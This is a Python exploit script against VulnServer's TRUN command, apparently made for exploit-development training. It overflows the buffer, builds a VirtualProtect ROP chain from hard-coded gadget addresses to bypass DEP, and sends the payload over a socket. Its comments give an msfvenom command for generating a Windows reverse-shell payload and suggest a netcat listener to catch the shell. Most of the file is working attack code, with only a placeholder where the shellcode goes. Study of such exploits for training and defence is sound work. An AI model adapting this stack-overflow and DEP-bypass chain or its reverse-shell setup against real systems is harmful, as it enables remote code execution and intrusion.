#!/usr/bin/env python3
"""
VulnServer TRUN Command - VirtualProtect DEP Bypass Exploit

This is a complete, working example of using VirtualProtect Inspector
to exploit VulnServer's TRUN command with DEP enabled.

Author: Anubhav Gain <anubhavg@infopercept.com>
GitHub: https://github.com/anubhavg-icpl/virtual-protect-inspector

DISCLAIMER: This script is for educational and authorized security testing only.
Only use against systems you own or have explicit permission to test.

Usage:
    1. Update TARGET_IP and TARGET_PORT
    2. Generate shellcode with msfvenom and update SHELLCODE
    3. Run: python3 vulnserver_trun_exploit.py

Prerequisites:
    - Windows 7/10 (32-bit) VM with DEP enabled
    - VulnServer running on the target
    - VirtualProtect Inspector installed
"""

import struct
import socket
import sys
import argparse

# Add parent directory to path for imports
sys.path.insert(0, '..')

from vp_inspector import ROPChainBuilder, Config, ExploitGenerator


# ============================================================================
# TARGET CONFIGURATION
# ============================================================================

TARGET_IP = "192.168.0.112"
TARGET_PORT = 9999

# Buffer overflow parameters
VULNSRVR_CMD = b"TRUN /.:/"
TOTAL_BUFFER_LEN = 6000
OFFSET = 2003  # Offset to EIP overwrite

# Bad characters (verify for your target)
BAD_CHARS = b"\x00"


# ============================================================================
# ROP GADGETS
# ============================================================================
# IMPORTANT: These addresses are specific to the target system!
# You MUST find your own gadgets using mona.py or similar tools.
# See the README for gadget hunting instructions.

GADGETS = {
    # VirtualProtect IAT entry in essfunc.dll
    "virtualprotect_iat": 0x6250609c,

    # Writable memory address (KERNEL32.dll .data section)
    "writable_address": 0x7653a3c1,

    # EBP - Stack alignment
    "pop_ebp": {
        "address": 0x775d8836,
        "description": "POP EBP; RET",
        "module": "msvcrt.dll"
    },

    # EBX - dwSize parameter setup
    "pop_eax_for_ebx": {
        "address": 0x75f366b4,
        "description": "POP EAX; RET",
        "module": "KERNELBASE.dll"
    },
    "neg_eax": {
        "address": 0x76505808,
        "description": "NEG EAX; RET",
        "module": "KERNEL32.dll"
    },
    "xchg_eax_ebx": {
        "address": 0x77597926,
        "description": "XCHG EAX, EBX; RET",
        "module": "msvcrt.dll"
    },

    # EDX - flNewProtect parameter setup
    "pop_eax_for_edx": {
        "address": 0x75d91838,
        "description": "POP EAX; RET",
        "module": "KERNELBASE.dll"
    },
    "xchg_eax_edx": {
        "address": 0x77d9e6c0,
        "description": "XCHG EAX, EDX; RET",
        "module": "ntdll.dll"
    },

    # ECX - lpflOldProtect parameter
    "pop_ecx": {
        "address": 0x775f94ee,
        "description": "POP ECX; RET",
        "module": "msvcrt.dll"
    },

    # EDI - ROP NOP
    "pop_edi": {
        "address": 0x76fe83f7,
        "description": "POP EDI; RET",
        "module": "WS2_32.dll"
    },
    "rop_nop": {
        "address": 0x7650580a,
        "description": "RET",
        "module": "KERNEL32.dll"
    },

    # ESI - JMP [EAX] gadget
    "pop_esi": {
        "address": 0x76525760,
        "description": "POP ESI; RET",
        "module": "KERNEL32.dll"
    },
    "jmp_eax": {
        "address": 0x75e95833,
        "description": "JMP [EAX]",
        "module": "KERNELBASE.dll"
    },

    # EAX - VirtualProtect pointer
    "pop_eax": {
        "address": 0x75ee5082,
        "description": "POP EAX; RET",
        "module": "KERNELBASE.dll"
    },

    # PUSHAD - Setup VirtualProtect call
    "pushad": {
        "address": 0x775d6f67,
        "description": "PUSHAD; RET",
        "module": "msvcrt.dll"
    },

    # JMP ESP - Return to shellcode
    "jmp_esp": {
        "address": 0x625011c7,
        "description": "JMP ESP",
        "module": "essfunc.dll"
    },
}


# ============================================================================
# SHELLCODE
# ============================================================================
# Generate with:
# msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f python -b '\x00'

# Placeholder shellcode - REPLACE WITH YOUR GENERATED SHELLCODE
SHELLCODE = (
    # This is just a placeholder - INT3 breakpoints for testing
    b"\xcc" * 4 +
    b"\x90" * 100 +
    b"\xcc" * 4
)

# Example msfvenom output (uncomment and replace):
# SHELLCODE = b""
# SHELLCODE += b"\xdb\xdc\xb8\x..."  # Your shellcode here


# ============================================================================
# EXPLOIT CODE
# ============================================================================

def build_rop_chain() -> bytes:
    """Build the VirtualProtect DEP bypass ROP chain."""

    builder = ROPChainBuilder()

    # Set VirtualProtect parameters
    builder.set_virtualprotect_iat(GADGETS["virtualprotect_iat"])
    builder.set_writable_address(GADGETS["writable_address"])
    builder.set_protection_size(0x201)  # 513 bytes
    builder.set_protection_flag(0x40)   # PAGE_EXECUTE_READWRITE

    # Add all gadgets
    gadget_mappings = [
        "pop_ebp", "pop_eax_for_ebx", "neg_eax", "xchg_eax_ebx",
        "pop_eax_for_edx", "xchg_eax_edx", "pop_ecx", "pop_edi",
        "rop_nop", "pop_esi", "jmp_eax", "pop_eax", "pushad", "jmp_esp"
    ]

    for name in gadget_mappings:
        gadget = GADGETS[name]
        builder.add_gadget(
            name=name,
            address=gadget["address"],
            description=gadget["description"],
            module=gadget["module"]
        )

    # Build and return the chain
    return builder.build()


def create_payload() -> bytes:
    """Create the complete exploit payload."""

    rop_chain = build_rop_chain()
    nop_sled = b"\x90" * 16

    payload = VULNSRVR_CMD
    payload += b"A" * OFFSET
    payload += rop_chain
    payload += nop_sled
    payload += SHELLCODE
    payload += b"C" * (TOTAL_BUFFER_LEN - len(payload))

    return payload


def send_exploit(target: tuple, payload: bytes) -> bool:
    """Send the exploit payload to the target."""

    try:
        print(f"[*] Connecting to {target[0]}:{target[1]}...")
        with socket.create_connection(target, timeout=10) as sock:
            # Receive banner
            banner = sock.recv(512)
            print(f"[*] Banner: {banner.decode('utf-8', errors='ignore').strip()}")

            # Send payload
            sock.send(payload)
            print(f"[+] Payload sent ({len(payload)} bytes)")

            return True

    except socket.timeout:
        print("[-] Connection timeout")
        return False
    except ConnectionRefusedError:
        print("[-] Connection refused - is VulnServer running?")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def print_banner():
    """Print the exploit banner."""
    banner = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║     __     ___      _               _ ____            _           _           ║
║     \\ \\   / (_)_ __| |_ _   _  __ _| |  _ \\ _ __ ___ | |_ ___  ___| |_         ║
║      \\ \\ / /| | '__| __| | | |/ _` | | |_) | '__/ _ \\| __/ _ \\/ __| __|        ║
║       \\ V / | | |  | |_| |_| | (_| | |  __/| | | (_) | ||  __/ (__| |_         ║
║        \\_/  |_|_|   \\__|\\__,_|\\__,_|_|_|   |_|  \\___/ \\__\\___|\\___|\\__|        ║
║                                                                               ║
║                    DEP Bypass - VulnServer TRUN Exploit                       ║
║                                                                               ║
║  Author: Anubhav Gain <anubhavg@infopercept.com>                             ║
║  GitHub: https://github.com/anubhavg-icpl/virtual-protect-inspector          ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def main():
    """Main exploit function."""

    parser = argparse.ArgumentParser(
        description="VulnServer TRUN - VirtualProtect DEP Bypass Exploit"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_IP,
        help=f"Target IP address (default: {TARGET_IP})"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=TARGET_PORT,
        help=f"Target port (default: {TARGET_PORT})"
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Print debug information"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Build payload but don't send"
    )

    args = parser.parse_args()

    print_banner()

    # Build the payload
    print("[*] Building exploit payload...")
    print(f"    Target: {args.target}:{args.port}")
    print(f"    Offset: {OFFSET}")

    rop_chain = build_rop_chain()
    print(f"    ROP Chain: {len(rop_chain)} bytes")
    print(f"    Shellcode: {len(SHELLCODE)} bytes")

    payload = create_payload()
    print(f"    Total Payload: {len(payload)} bytes")

    if args.debug:
        print("\n[DEBUG] ROP Chain (hex):")
        for i in range(0, len(rop_chain), 4):
            addr = struct.unpack("<I", rop_chain[i:i+4])[0]
            print(f"    0x{addr:08x}")

    if args.dry_run:
        print("\n[*] Dry run - payload not sent")
        print("[*] Payload hex dump (first 200 bytes):")
        print(f"    {payload[:200].hex()}")
        return

    print()
    confirm = input("[?] Send exploit payload? (y/N): ")
    if confirm.lower() != 'y':
        print("[*] Aborted")
        return

    # Send the exploit
    target = (args.target, args.port)
    if send_exploit(target, payload):
        print("\n[+] Exploit sent successfully!")
        print("[*] If you have a listener running, check for incoming connection")
        print("[*] Example: nc -lvnp 4444")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
